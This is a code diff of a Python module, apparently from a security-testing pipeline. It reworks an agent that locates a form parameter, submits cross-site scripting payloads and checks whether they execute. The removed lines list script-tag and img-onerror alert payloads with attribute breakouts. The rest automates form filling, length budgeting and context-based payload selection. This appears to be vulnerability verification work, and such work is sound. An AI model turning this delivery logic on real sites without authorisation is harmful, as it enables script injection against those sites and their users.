@@ -1,91 +1,52 @@
-"""Direct (first-order) agent: deliver a payload into one request path and verify it.
+"""Direct (first-order) agent.
 
-The slice names the input parameter and the sink on the same page, so there is
-no database round trip: build a candidate request, send it, and read the
-response with ``verify_tag``. The agent's output is the same ``TriggerResult``
-shape the pipeline already understands, so scheduling stays uniform.
+First-order slices name both the input parameter and the sink on one request
+path, so the pipeline is the trigger agent's skeleton minus the database: prove
+the entry, deliver a payload through the application's own form, and let
+``verify_tag`` decide. Delivery, candidate ranking, payload shapes, length
+budgeting and the verdict vocabulary are the same pieces the inject and trigger
+agents use — this module only sequences them.
 
-First-order vs second-order is decided by where the slice came from (the navi
-``direct/`` tree versus the joined/inject trees), never by inspecting the
-slice's own features.
+Family selection is by slice origin (the navi ``direct/`` tree), never by
+inspecting slice features.
 """
 
 from __future__ import annotations
 
 import os
-import re
 import secrets
+import string
 from typing import Any
 from urllib.parse import urlencode
 
-from tia.cap.entry import infer_read_entry
-from tia.dom.trigger import (
-    _FORM_ACTION_RE,
-    _FORM_METHOD_RE,
-    _INPUT_NAME_RE,
-    StageRecord,
-    TriggerResult,
-    normalize_slice,
+from tia.cap.domscan import parse
+from tia.cap.entry import (
+    EntryPlan,
+    derive_payload_constraints,
+    entry_candidates,
+    infer_entry,
 )
+from tia.cap.forms import (
+    PageForm,
+    find_form,
+    forms_from_document,
+    forms_from_formparse,
+    merge_forms,
+)
+from tia.cap.payloads import render, shapes_for
+from tia.dom.trigger import _POST_VAR_RE, StageRecord, TriggerResult, normalize_slice
 from tia.inf.runtime import get_runtime
+from tia.orch.judge import judge_direct
 from tia.orch.kernel import Kernel, LocalToolClient, ToolCallError, ToolClient
 
-#: Bounded exploration: markup contexts need a couple of shapes, not a fuzzer.
-DIRECT_ATTEMPTS = max(1, int(os.environ.get("TIA_DIRECT_ATTEMPTS", "6")))
 
-#: Payload shapes, cheapest and most likely first. ``{tag}`` is a 4-char marker
-#: that lets ``verify_tag`` prove the bytes arrived.
-_PAYLOADS = (
-    "<script>alert('{tag}')</script>",
-    '<img src=x onerror=alert("{tag}")>',
-    '"><script>alert(\'{tag}\')</script>',
-    "'><img src=x onerror=alert('{tag}')>",
-    "{tag}",
-)
+def _attempts() -> int:
+    return max(1, int(os.environ.get("TIA_DIRECT_ATTEMPTS", "8")))
 
 
 def _tag() -> str:
-    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
+    alphabet = string.ascii_lowercase + string.digits
     return "".join(secrets.choice(alphabet) for _ in range(4))
-
-
-_FORM_BLOCK_RE = re.compile(r"<form\b[^>]*>.*?</form>", re.IGNORECASE | re.DOTALL)
-
-
-def _forms(html: str) -> list[tuple[str, str, dict[str, str]]]:
-    """Every form in document order as (action, method, fields)."""
-    found: list[tuple[str, str, dict[str, str]]] = []
-    for block in _FORM_BLOCK_RE.finditer(html):
-        text = block.group(0)
-        action_match = _FORM_ACTION_RE.search(text)
-        method_match = _FORM_METHOD_RE.search(text)
-        fields: dict[str, str] = {}
-        for name_match in _INPUT_NAME_RE.finditer(text):
-            fields.setdefault(name_match.group(1), "")
-        found.append(
-            (
-                action_match.group(1) if action_match else "",
-                (method_match.group(1) if method_match else "GET").upper(),
-                fields,
-            )
-        )
-    return found
-
-
-def _form_fields(html: str, param: str = "") -> tuple[str, str, dict[str, str]]:
-    """Pick the form that carries ``param``; the page often has a header form.
-
-    The first form on an xvwa page is usually the site-wide login box, so
-    matching the entry parameter beats document order.
-    """
-    forms = _forms(html)
-    if not forms:
-        return "", "GET", {}
-    if param:
-        for action, method, fields in forms:
-            if param in fields:
-                return action, method, fields
-    return forms[0]
 
 
 async def run_direct(
@@ -97,21 +58,16 @@ async def run_direct(
     client: ToolClient | None = None,
     slice_id: str | None = None,
 ) -> TriggerResult:
-    """D0–D4: create case, find the input, deliver candidates, verify the response."""
-    del payload_base  # direct mode starts from context-shaped payloads, not a template
+    """D0–D6: case, entry, candidates, delivery, verification, report."""
+    del payload_base  # shapes come from the observed context, not a template
     raw = normalize_slice(raw_slice)
     kernel = Kernel(
-        "inject",  # same capability surface: read source, send HTTP, verify
+        "inject",  # same capability surface as the trigger/inject agents
         case_id=None,
         budget=budget,
         client=client or LocalToolClient("inject"),
     )
-    source_param = ""
-    sources = raw.get("sources")
-    if isinstance(sources, list) and sources:
-        first = sources[0]
-        if isinstance(first, dict):
-            source_param = str(first.get("param") or "")
+    source_param = _source_param(raw)
     opened = await kernel.call(
         "case_open",
         {"slice": raw, "agent": "direct", "write_targets": []},
@@ -125,117 +81,226 @@ async def run_direct(
     file, line, sink_code = _sink_of(raw)
     if not file:
         stages.append(StageRecord("D1", False, "slice has no sink file"))
-        return await _finish(kernel, case_id, "NOT_EXECUTED", stages, notes, "")
+        return await _finish(kernel, case_id, "NOT_EXECUTED", stages, notes)
 
-    # D1 Source context: the parameter and the sink shape come from the window.
-    window = await kernel.call(
-        "source_read",
-        {"file": file, "around": {"line": line, "n": 40}},
-    )
+    # D1 Source context: the parameter, its method and the sink shape.
+    window = await kernel.call("source_read", {"file": file, "around": {"line": line, "n": 40}})
     text = "\n".join(str(item.get("text", "")) for item in window.get("lines", []))
-    method, fields = infer_read_entry(text, require_where=False)
-    if source_param and not any(field.name == source_param for field in fields):
-        notes["source_param_not_in_window"] = True
-    notes["sink_code"] = sink_code
-    notes["source_window_sha256"] = window.get("sha256")
-    stages.append(StageRecord("D1", True, f"file={file}:{line} method={method}"))
+    plan = infer_entry(text)
+    post_params = sorted(set(_POST_VAR_RE.findall(text)))
+    if source_param and source_param not in post_params:
+        post_params.append(source_param)
+    notes.update(
+        {
+            "sink_code": sink_code,
+            "source_window_sha256": window.get("sha256"),
+            "entry_plan": {"method": plan.method, "has_filter": plan.has_filter},
+            "params": post_params,
+        }
+    )
+    stages.append(StageRecord("D1", True, f"file={file}:{line} method={plan.method} params={post_params}"))
 
-    # D2 Entry page: the form tells us where to deliver and which fields to send.
+    # D2 Entry page, parsed by the same ``form_parse`` tool the inject agent uses.
     page = await kernel.call("http_request", {"method": "GET", "url": base_url})
-    body = str(page.get("body", ""))
     status = int(page.get("status", 0))
     if status >= 400:
         notes["page_status"] = status
         stages.append(StageRecord("D2", False, f"page status {status}"))
-        return await _finish(kernel, case_id, "READ_NOT_REFLECTED", stages, notes, "")
-    action, form_method, form_fields = _form_fields(body, source_param)
-    target = _absolute(action, base_url) if action else base_url
-    names = list(form_fields) or [field.name for field in fields if field.name]
-    param = source_param or (fields[0].name if fields else (names[0] if names else ""))
-    notes["entry"] = {"url": target, "method": form_method, "param": param}
-    stages.append(StageRecord("D2", True, f"action={target} method={form_method} param={param}"))
+        return await _finish(kernel, case_id, "READ_NOT_REFLECTED", stages, notes)
+    body = str(page.get("body", ""))
+    parsed = await kernel.call(
+        "form_parse", {"html": body, "base_url": base_url, "max_forms": 20}
+    )
+    doc_forms = forms_from_document(parse(body), base_url)
+    forms = merge_forms(doc_forms, forms_from_formparse(parsed.get("forms") or [], base_url))
+    param = _pick_param(plan, post_params, forms)
+    method = "post" if plan.method.upper() == "POST" else None
+    form = find_form(forms, param, method=method) or find_form(forms, param)
+    if form is None:
+        stages.append(StageRecord("D2", False, "no form on the entry page"))
+        return await _finish(kernel, case_id, "NOT_EXECUTED", stages, notes)
+    notes["entry"] = {
+        "url": form.action,
+        "method": form.method,
+        "param": param,
+        "fields": form.names,
+        "csrf_candidates": list(parsed.get("forms") and (parsed["forms"][0].get("csrf_candidates") or [])),
+    }
+    stages.append(StageRecord("D2", True, f"action={form.action} method={form.method} param={param}"))
 
-    # D3–D4 Bounded candidate delivery; the first executable hit wins.
+    # D3 Length budget through the same ``budget_solve`` tool used elsewhere.
+    field = _field_for(form, param)
+    maxlength = field.maxlength if field is not None else None
+    limits = await kernel.call(
+        "budget_solve",
+        {"maxlength": maxlength} if maxlength else {"validation_limit": 4096},
+    )
+    allowed = int(limits.get("max_payload_len") or 0)
+    notes["budget"] = {
+        "maxlength": maxlength,
+        "allowed": allowed,
+        "limiting_factor": limits.get("limiting_factor"),
+    }
+    stages.append(StageRecord("D3", True, f"maxlength={maxlength} allowed={allowed}"))
+
+    # D4 Bounded exploration, trigger-style: a tag probe learns the context,
+    # then shapes for that context are tried. Entry candidates from
+    # ``entry_candidates`` rank how to fill the other fields.
+    tag = _tag()
+    candidates = await entry_candidates(
+        plan,
+        tag=tag,
+        row={},
+        pk_columns=[],
+        context=text,
+        client=None,
+        limit=2,
+    )
+    notes["entry_candidates"] = [
+        {"method": item.method, "values": item.values, "confidence": item.confidence, "basis": item.basis}
+        for item in candidates
+    ]
     attempts: list[dict[str, Any]] = []
-    for index, template in enumerate(_PAYLOADS[:DIRECT_ATTEMPTS]):
-        tag = _tag()
-        payload = template.format(tag=tag)
-        if names:
-            values = {name: "" for name in names}
-            if param:
-                values[param] = payload
-        else:
-            values = {param: payload} if param else {}
-        try:
-            if form_method == "POST":
-                request = {
-                    "method": "POST",
-                    "url": target,
-                    "body": urlencode(values),
-                    "headers": {"content-type": "application/x-www-form-urlencoded"},
-                }
-            else:
-                request = {"method": "GET", "url": target, "params": values}
-            response = await kernel.call("http_request", request)
-        except ToolCallError as exc:
-            err_body = exc.envelope.error
-            attempts.append(
-                {
-                    "index": index,
-                    "payload": payload,
-                    "error": err_body.code if err_body else "TOOL_ERROR",
-                }
-            )
-            continue
-        html = str(response.get("body", ""))
-        content_type = str(response.get("content_type") or "text/html")
-        verify = await kernel.call(
-            "verify_tag",
-            {"html": html, "tag": tag, "payload": payload, "content_type": content_type},
+    budget_left = _attempts()
+    for candidate in [*candidates, None]:
+        if budget_left <= 0:
+            break
+        probe_tag = _tag()
+        probe = await _deliver_and_verify(
+            kernel, form, param, render("tag", probe_tag), candidate, probe_tag
         )
-        best = verify.get("best") if isinstance(verify.get("best"), dict) else {}
-        attempt = {
-            "index": index,
-            "payload": payload,
-            "payload_length": len(payload),
-            "found": bool(verify.get("found")),
-            "occurrences": verify.get("occurrence_count", 0),
-            "executable": bool(best.get("executable")),
-            "context_kind": best.get("context_kind"),
-            "reason": best.get("executable_reason"),
-            "node_path": best.get("node_path"),
-        }
-        attempts.append(attempt)
-        if attempt["executable"]:
-            notes["payload"] = payload
-            notes["payload_constraints"] = {
-                "context_kind": attempt["context_kind"],
-                "node_path": attempt["node_path"],
-                "payload_length": len(payload),
-                "requires_breakout": attempt["context_kind"] in {"attr", "script_string"},
-            }
+        budget_left -= 1
+        attempts.append(probe)
+        if probe.get("executable"):
+            break
+        context_kind = str(probe.get("context_kind") or "")
+        for shape in shapes_for(context_kind):
+            if budget_left <= 0:
+                break
+            tag = _tag()
+            payload = render(shape, tag)
+            if allowed and len(payload) > allowed:
+                payload = render("tag", tag)
+                shape = "tag"
+            attempt = await _deliver_and_verify(kernel, form, param, payload, candidate, tag, shape)
+            budget_left -= 1
+            attempts.append(attempt)
+            if attempt.get("executable"):
+                break
+        if any(item.get("executable") for item in attempts):
             break
     notes["attempts"] = attempts
-    stages.append(StageRecord("D3", True, f"attempts={len(attempts)}"))
-    verdict, explanation = _judge(attempts)
+    stages.append(StageRecord("D4", True, f"attempts={len(attempts)} budget_left={budget_left}"))
+
+    verdict, explanation = judge_direct(attempts)
     notes["explanation"] = explanation
-    stages.append(StageRecord("D4", verdict == "EXECUTED", explanation))
-    return await _finish(kernel, case_id, verdict, stages, notes, "")
+    stages.append(StageRecord("D5", verdict == "EXECUTED", explanation))
+    best = next((item for item in attempts if item.get("executable")), None) or next(
+        (item for item in attempts if item.get("found")), None
+    )
+    if best is not None:
+        notes["payload"] = best.get("payload")
+        notes["payload_constraints"] = {
+            **derive_payload_constraints(
+                best.get("verify") or {},
+                column=param,
+                column_length=maxlength,
+                payload=str(best.get("payload") or ""),
+            ),
+            "field": param,
+            "maxlength": maxlength,
+        }
+    return await _finish(kernel, case_id, verdict, stages, notes)
 
 
-def _judge(attempts: list[dict[str, Any]]) -> tuple[str, str]:
-    if not attempts:
-        return "NOT_EXECUTED", "no attempt could be delivered"
-    executable = [item for item in attempts if item.get("executable")]
-    if executable:
-        return "EXECUTED", f"executable payload: {executable[0]['payload']}"
-    found = [item for item in attempts if item.get("found")]
-    if not found:
-        return "READ_NOT_REFLECTED", "payload never appeared in the response"
-    reasons = {str(item.get("reason")) for item in found}
-    if "ENCODED_ONLY" in reasons:
-        return "REFLECTED_ENCODED", "payload is encoded in the response"
-    return "REFLECTED_INERT", "payload is reflected but not executable"
+async def _deliver_and_verify(
+    kernel: Kernel,
+    form: PageForm,
+    param: str,
+    payload: str,
+    candidate: Any,
+    tag: str,
+    shape: str = "tag",
+) -> dict[str, Any]:
+    """Fill the form, submit it, and classify the response with ``verify_tag``."""
+    values = {item.name: item.value for item in form.fields}
+    for key, value in (getattr(candidate, "values", None) or {}).items():
+        if key in values:
+            values[key] = str(value)
+    if param:
+        values[param] = payload
+    try:
+        if form.method == "post":
+            response = await kernel.call(
+                "http_request",
+                {
+                    "method": "POST",
+                    "url": form.action,
+                    "body": urlencode(values),
+                    "headers": {"Content-Type": form.enctype},
+                },
+            )
+        else:
+            response = await kernel.call(
+                "http_request",
+                {"method": "GET", "url": form.action, "params": values},
+            )
+    except ToolCallError as exc:
+        body = exc.envelope.error
+        return {
+            "shape": shape,
+            "payload": payload,
+            "candidate": getattr(candidate, "basis", None),
+            "delivered": False,
+            "error": body.code if body else "TOOL_ERROR",
+        }
+    html = str(response.get("body", ""))
+    verify = await kernel.call(
+        "verify_tag",
+        {
+            "html": html,
+            "tag": tag,
+            "payload": payload,
+            "content_type": str(response.get("content_type") or "text/html"),
+        },
+    )
+    best = verify.get("best") if isinstance(verify.get("best"), dict) else {}
+    return {
+        "shape": shape,
+        "payload": payload,
+        "candidate": getattr(candidate, "basis", None),
+        "delivered": True,
+        "status": response.get("status"),
+        "found": bool(verify.get("found")),
+        "occurrences": verify.get("occurrence_count", 0),
+        "executable": bool(best.get("executable")),
+        "context_kind": best.get("context_kind"),
+        "reason": best.get("executable_reason"),
+        "node_path": best.get("node_path"),
+        "verify": verify,
+    }
+
+
+def _source_param(raw: dict[str, Any]) -> str:
+    sources = raw.get("sources")
+    if isinstance(sources, list) and sources and isinstance(sources[0], dict):
+        return str(sources[0].get("param") or "")
+    return ""
+
+
+def _pick_param(plan: EntryPlan, params: list[str], forms: list[PageForm]) -> str:
+    names = {name for form in forms for name in form.names}
+    for param in params:
+        if param in names:
+            return param
+    for field in plan.fields:
+        if field.name in names:
+            return field.name
+    return params[0] if params else (plan.fields[0].name if plan.fields else "")
+
+
+def _field_for(form: PageForm, param: str) -> Any:
+    return next((item for item in form.fields if item.name == param), None)
 
 
 async def _finish(
@@ -244,11 +309,10 @@ async def _finish(
     verdict: str,
     stages: list[StageRecord],
     notes: dict[str, Any],
-    _report_hint: str,
 ) -> TriggerResult:
     get_runtime().store.set_case_verdict(case_id, verdict, ceiling="EXECUTABLE")
     report = await kernel.report()
-    stages.append(StageRecord("D5", True, "report generated"))
+    stages.append(StageRecord("D6", True, "report generated"))
     return TriggerResult(
         case_id=case_id,
         verdict=verdict,
@@ -269,13 +333,3 @@ def _sink_of(raw: dict[str, Any]) -> tuple[str, int, str]:
         line_text, _, code = rest.partition(" ")
         return head, int(line_text) if line_text.isdigit() else 0, code
     return str(raw.get("sinkFile") or ""), int(raw.get("sinkLine") or 0), str(raw.get("sinkCode") or "")
-
-
-def _absolute(action: str, base_url: str) -> str:
-    if action.startswith(("http://", "https://")):
-        return action
-    if action.startswith("/"):
-        root = "/".join(base_url.split("/")[:3])
-        return root + action
-    return base_url if base_url.endswith("/") else base_url + "/" + action
-
